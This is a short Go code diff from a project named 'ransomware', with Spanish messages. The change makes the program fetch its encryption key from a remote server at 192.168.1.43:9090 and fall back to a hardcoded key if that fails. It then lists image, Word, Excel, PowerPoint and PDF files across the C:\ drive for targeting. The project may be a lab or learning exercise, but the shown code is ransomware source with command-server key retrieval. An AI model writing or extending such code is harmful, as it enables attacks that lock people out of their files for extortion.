@@ -7,9 +7,14 @@ import (
 	"ransomware/vacineUtils"
 )
 
-const key = "clave"
+const defaultKey = "clave"
 
 func main() {
+	key, err := ransomUtils.ObtenerClave("192.168.1.43:9090")
+	if err != nil {
+		fmt.Println("Error al obtener la palabra:", err)
+		key= defaultKey
+	}
 	files, errListFiles := comunUtils.ListFiles(`C:\`, []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"})
 	if errListFiles != nil {
 		fmt.Println("Error:", errListFiles)
